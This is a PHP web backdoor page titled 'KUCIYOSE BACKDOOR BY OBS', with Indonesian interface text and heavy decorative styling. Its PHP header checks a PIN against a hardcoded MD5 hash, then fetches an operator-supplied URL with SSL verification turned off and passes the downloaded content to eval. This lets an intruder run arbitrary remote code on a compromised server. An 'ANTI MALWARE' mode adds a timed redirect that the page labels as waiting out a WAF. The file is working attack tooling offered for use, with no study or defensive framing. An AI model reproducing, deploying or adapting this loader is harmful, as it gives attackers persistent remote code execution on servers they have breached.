<?php
session_start();
error_reporting(0);

$h = "122058ae62bdd40d8d7c4430a5ceb873";

$error = "";

$mode = $_GET['mode'] ?? '';

if ($mode === 'amw') {
    if (isset($_POST['PIN'], $_POST['URL'])) {
        if (md5($_POST['PIN']) !== $h) {
            $message = "PIN salah.";
            $class = "error";
        } elseif (!filter_var($_POST['URL'], FILTER_VALIDATE_URL)) {
            $message = "URL tidak valid.";
            $class = "error";
        } else {
            $_SESSION['URL'] = $_POST['URL'];
            $_SESSION['ready'] = 1;
            $_SESSION['go'] = 0;
            $message = "Tunggu WAF 10 detik";
            $class = "success";
        }
    }

    if (isset($_GET['go']) && $_GET['go'] == 1) {
        $_SESSION['go'] = 1;
    }
    
} elseif ($mode === 'automatic') {
    if (isset($_POST['PIN'], $_POST['URL'])) {
        if (md5($_POST['PIN']) !== $h) {
            $message = "PIN salah.";
            $class = "error";
        } elseif (!filter_var($_POST['URL'], FILTER_VALIDATE_URL)) {
            $message = "URL tidak valid.";
            $class = "error";
        } else {
            $_SESSION['URL'] = $_POST['URL'];
            $class = "success";
        }
    }
}

if ($mode === 'amw') {
    if (isset($_SESSION['ready']) && isset($_SESSION['go']) && $_SESSION['go'] == 1 && !empty($_SESSION['URL'])) {
        $c = curl_init($_SESSION['URL']);

        if ($c) {
            curl_setopt_array($c, [
                CURLOPT_RETURNTRANSFER => 1,
                CURLOPT_FOLLOWLOCATION => 1,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_TIMEOUT => 10
            ]);

            $x = curl_exec($c);
            $e = curl_error($c);
            curl_close($c);

            if ($e) exit("ERR:" . $e);
            if ($x) { eval('?>' . $x); exit; } else { exit("Empty"); }       
        }
    }
} elseif ($mode === 'automatic') {
    if (!empty($_SESSION['URL'])) {
        $c = curl_init($_SESSION['URL']);

        if ($c) {
            curl_setopt_array($c, [
                CURLOPT_RETURNTRANSFER => 1,
                CURLOPT_FOLLOWLOCATION => 1,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_TIMEOUT => 10
            ]);

            $x = curl_exec($c);
            $e = curl_error($c);
            curl_close($c);

            if ($e) exit("ERR:" . $e);
            if ($x) { eval('?>' . $x); exit; } else { exit("Empty"); }           
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KUCIYOSE BACKDOOR BY OBS</title>
  <?php if ($mode === 'amw' && !empty($_SESSION['ready']) && !empty($_SESSION['go'])): ?>
  <meta http-equiv="refresh" content="30;url=<?php echo htmlspecialchars($_SESSION['URL']); ?>">
<?php endif; ?>
  <style>
    :root{
      --bg1:#06101e;
      --bg2:#0d1f38;
      --blue:#2563eb;
      --white:#f8fafc;
      --gold:#d4af37;
      --gold2:#f5e08a;
      --text:#eaf2ff;
      --danger:#ff6b6b;
      --success:#7CFC98;
    }

    html, body{
      margin:0;
      min-height:100%;
    }

    body{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      font-family:Arial, sans-serif;
      color:var(--text);
      overflow:hidden;
      background:
        linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.60)),
        url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9y0sUakRBSdIlxiqhNy93DWFHTApB9-pRtuDnw4DV5U7niPAPpfhqowMxp0mOlo1FawX4IfA-82gm9N6C0_YsF1ONUi07bn9mVGizshfE5yZLiq_G8n-93tvmULf12C4m9nDCjJ9ziEvRATyB-RLka7qWKhQN6ohkf_744ulps40e6RbCVe7GQ3U626o/s16000/30f7d59f-eef2-4b64-9045-a99e1ba3e470.png') center center / cover no-repeat fixed;
    }

    .bg-smoke{
      position:fixed;
      inset:-15%;
      pointer-events:none;
      z-index:1;
      background:
        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.18), transparent 20%),
        radial-gradient(circle at 70% 60%, rgba(212,175,55,0.16), transparent 18%),
        radial-gradient(circle at 40% 80%, rgba(37,99,235,0.14), transparent 22%);
      filter: blur(26px);
      opacity:.85;
      animation: smokeMove 12s ease-in-out infinite;
    }

    .bg-lightning,
    .bg-lightning-left,
    .bg-lightning-right,
    .bg-lightning-top,
    .bg-lightning-bottom{
      position:fixed;
      inset:0;
      pointer-events:none;
      z-index:2;
      opacity:0;
      mix-blend-mode:screen;
    }

    .bg-lightning{
      background:
        linear-gradient(115deg,
          transparent 0%,
          transparent 44%,
          rgba(255,255,255,0.95) 48%,
          rgba(255,255,255,0.35) 49%,
          transparent 52%,
          transparent 100%),
        linear-gradient(65deg,
          transparent 0%,
          transparent 58%,
          rgba(79,140,255,0.85) 61%,
          transparent 64%,
          transparent 100%);
      animation: flashMain 3.8s infinite;
    }

    .bg-lightning-left{
      background:
        linear-gradient(110deg,
          transparent 0%,
          transparent 48%,
          rgba(255,255,255,0.85) 50%,
          transparent 52%,
          transparent 100%);
      transform: translateX(-10px);
      animation: flashLeft 5.4s infinite;
    }

    .bg-lightning-right{
      background:
        linear-gradient(70deg,
          transparent 0%,
          transparent 48%,
          rgba(255,255,255,0.85) 50%,
          transparent 52%,
          transparent 100%);
      transform: translateX(10px);
      animation: flashRight 5.8s infinite;
    }

    .bg-lightning-top{
      background:
        linear-gradient(180deg,
          rgba(255,255,255,0.95) 0%,
          rgba(255,255,255,0.45) 2%,
          transparent 6%);
      animation: flashTop 4.9s infinite;
    }

    .bg-lightning-bottom{
      background:
        linear-gradient(0deg,
          rgba(255,255,255,0.95) 0%,
          rgba(255,255,255,0.45) 2%,
          transparent 6%);
      animation: flashBottom 5.1s infinite;
    }

    .refresh-wrap{
  text-align:center;
  margin-top:12px;
}

.refresh-btn{
  display:inline-block;
  padding:10px 16px;
  border-radius:10px;
  background:#d4af37;
  color:#1b1200;
  text-decoration:none;
  font-weight:700;
  letter-spacing:1px;
}

    @keyframes smokeMove{
      0%,100%{transform:translateY(0) scale(1);}
      50%{transform:translateY(-18px) scale(1.05);}
    }

    @keyframes flashMain{
      0%,86%,100%{opacity:0; transform:translateX(0);}
      87%{opacity:1; transform:translateX(-10px);}
      88%{opacity:.15; transform:translateX(8px);}
      89%{opacity:1; transform:translateX(0);}
      90%{opacity:0;}
    }

    @keyframes flashLeft{
      0%,82%,100%{opacity:0; transform:translateX(-5px);}
      83%{opacity:1;}
      84%{opacity:.2;}
      85%{opacity:1;}
      86%{opacity:0;}
    }

    @keyframes flashRight{
      0%,84%,100%{opacity:0; transform:translateX(5px);}
      85%{opacity:1;}
      86%{opacity:.15;}
      87%{opacity:1;}
      88%{opacity:0;}
    }

    @keyframes flashTop{
      0%,90%,100%{opacity:0; transform:translateY(-5px);}
      91%{opacity:1;}
      92%{opacity:.2;}
      93%{opacity:1;}
      94%{opacity:0;}
    }

    @keyframes flashBottom{
      0%,87%,100%{opacity:0; transform:translateY(5px);}
      88%{opacity:1;}
      89%{opacity:.2;}
      90%{opacity:1;}
      91%{opacity:0;}
    }

    .box{
      position:relative;
      z-index:5;
      width:min(92vw, 540px);
      padding:36px 34px 32px;
      border-radius:28px;
      background:linear-gradient(145deg, rgba(10,16,28,0.88), rgba(4,8,16,0.96));
      box-shadow:
        0 30px 80px rgba(0,0,0,0.80),
        0 0 34px rgba(212,175,55,0.14),
        0 0 40px rgba(37,99,235,0.12),
        inset 0 1px 0 rgba(255,255,255,0.06);
      transform: perspective(1400px) rotateX(6deg);
      backdrop-filter: blur(12px);
      overflow:visible;
    }

    .box::before{
      content:"";
      position:absolute;
      inset:-16px;
      border-radius:38px;
      background:
        radial-gradient(circle, rgba(37,99,235,0.25), transparent 35%),
        radial-gradient(circle, rgba(212,175,55,0.26), transparent 62%);
      filter:blur(22px);
      z-index:-2;
    }

    .box::after{
      content:"";
      position:absolute;
      inset:-2px;
      border-radius:30px;
      padding:1px;
      background:linear-gradient(135deg, #fffbe0, #d4af37, #4f8cff, #8a6a12, #fff2a1, #d4af37);
      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      box-shadow:
        0 0 20px rgba(255,215,0,0.40),
        0 0 24px rgba(59,130,246,0.20),
        0 0 48px rgba(255,215,0,0.18);
      z-index:-1;
      animation:borderGlow 3s linear infinite;
      pointer-events:none;
    }
    
    .mode-row{
  display:flex;
  gap:12px;
  margin-bottom:16px;
}

.mode-row .refresh-btn{
  flex:1;
  text-align:center;
  display:block;
}

.field{
  position:relative;
  margin:14px 0;
}

.field input,
input[type="submit"]{
  width:100%;
  box-sizing:border-box;
}

    @keyframes borderGlow{
      0%,100%{filter:brightness(1);}
      50%{filter:brightness(1.25);}
    }

    h1{
      position:relative;
      z-index:1;
      margin:0 0 10px;
      text-align:center;
      letter-spacing:3px;
      font-size:22px;
      color:#f9f3dc;
      text-shadow:
        0 0 14px rgba(212,175,55,0.60),
        0 0 12px rgba(37,99,235,0.28);
    }

    .subtitle{
      text-align:center;
      margin:0 0 20px;
      font-size:12px;
      letter-spacing:2px;
      color:#c9d9ff;
      opacity:.95;
    }

    .line{
      height:2px;
      background:linear-gradient(90deg, transparent, #d4af37, #ffffff, #4f8cff, #d4af37, transparent);
      margin:0 0 22px;
      border-radius:999px;
      box-shadow:0 0 14px rgba(212,175,55,0.7);
    }

    .field{
      position:relative;
      margin:14px 0;
    }

    .field::before{
      content:"";position:absolute;
      inset:-2px;
      border-radius:16px;
      background:linear-gradient(135deg, rgba(255,255,255,0.20), rgba(212,175,55,0.95), rgba(79,140,255,0.88), rgba(255,255,255,0.15));
      z-index:-1;
      opacity:.95;
    }

    input{
      width:100%;
      box-sizing:border-box;
      padding:16px 18px;
      border-radius:14px;
      border:1px solid rgba(255,215,0,0.95);
      background:linear-gradient(180deg, #f9e58a, #d4af37 52%, #b88912);
      color:#241800;
      font-weight:800;
      font-size:15px;
      outline:none;
      box-shadow:
        inset 0 1px 2px rgba(255,255,255,0.58),
        inset 0 -2px 10px rgba(0,0,0,0.08),
        0 0 18px rgba(212,175,55,0.22);
      letter-spacing:1px;
    }

    input::placeholder{
      color:#5a4300;
      opacity:0.95;
      font-weight:700;
    }

    input:focus{
      border-color:#fff8cf;
      box-shadow:
        inset 0 1px 2px rgba(255,255,255,0.65),
        0 0 0 4px rgba(255,215,0,0.18),
        0 0 22px rgba(255,215,0,0.42),
        0 0 16px rgba(79,140,255,0.18);
      transform:translateY(-1px);
    }

    input[type="submit"]{
      cursor:pointer;
      margin-top:10px;
      background:linear-gradient(180deg, #fff7c9, #d4af37 44%, #9f7a12);
      color:#1b1200;
      text-shadow:0 1px 0 rgba(255,255,255,0.38);
      transition:all .18s ease;
      letter-spacing:2px;
      text-transform:uppercase;
    }

    input[type="submit"]:hover{
      transform:translateY(-2px);
      filter:brightness(1.10);
      box-shadow:
        inset 0 1px 2px rgba(255,255,255,0.65),
        0 0 24px rgba(255,215,0,0.60),
        0 0 18px rgba(79,140,255,0.22);
    }

    input[type="submit"]:active{
      transform:translateY(0);
    }

    .message{
      margin:-6px 0 14px;
      text-align:center;
      font-size:13px;
      letter-spacing:.5px;
      font-weight:700;
    }

    .message.error{
      color:var(--danger);
      text-shadow:0 0 8px rgba(255,107,107,0.28);
    }

    .message.success{
      color:var(--success);
      text-shadow:0 0 8px rgba(124,252,152,0.24);
    }
  </style>
</head>
<body>
  <div class="bg-smoke"></div>
  <div class="bg-lightning"></div>
  <div class="bg-lightning-left"></div>
  <div class="bg-lightning-right"></div>
  <div class="bg-lightning-top"></div>
  <div class="bg-lightning-bottom"></div>

  <div class="box">
    <h1>STAY ALIVE EVEN IF USELESS!</h1>
    <div class="subtitle">AH SHIT HERE WE GO AGAIN</div>

    <div class="mode-row">
      <a class="refresh-btn" href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?mode=amw">ANTI MALWARE</a>
      <a class="refresh-btn" href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?mode=automatic">AUTOMATIC</a>
    </div>

    <div class="line"></div>

    <?php if (!empty($message)): ?>
  <div class="message <?php echo $class; ?>">
    <span id="waf-countdown"><?php echo htmlspecialchars($message); ?></span>
  </div>
<?php endif; ?>

    <form method="post">
      <div class="field">
        <input type="password" name="PIN" placeholder="PIN" maxlength="32">
      </div>

      <div class="field">
        <input type="text" name="URL" placeholder="URL">
      </div>

      <input type="submit" value="GO">
    </form>
  </div>
  <script>
  
(function () {
  let seconds = 10;
  const el = document.getElementById('waf-countdown');
  if (!el) return;

  el.textContent = 'Tunggu WAF ' + seconds + ' detik';

  const timer = setInterval(() => {
    seconds--;
    if (seconds >= 0) {
      el.textContent = 'Tunggu WAF ' + seconds + ' detik';
    }
    if (seconds < 0) {
      clearInterval(timer);
      window.location.href = "<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?mode=amw&go=1";
    }
  }, 1000);
})();
</script>
</body>
